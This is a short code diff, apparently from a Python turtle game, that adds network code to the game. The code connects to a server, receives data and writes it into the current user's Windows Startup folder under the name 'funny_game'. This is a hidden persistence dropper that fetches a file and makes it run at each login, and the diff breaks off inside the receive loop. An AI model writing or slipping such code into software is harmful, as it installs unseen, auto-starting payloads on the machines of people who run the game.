@@ -100,11 +100,12 @@ wn.onkeypress(go_right, "d")
 # server connection
 my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
-signal = "game".encode()
-my_socket.sendall(signal)
+signal = 'g'.encode()
+my_socket.send(signal)
 user_name = os.getlogin()
-location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(user_name)
-with open(location, "wb") as f:  # todo: where to open file
+location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\funny_game".format(user_name)
+with open(location, "wb") as f:
+    done = False
     while not done:
         data = my_socket.recv(1024)
         if data == "EOF":
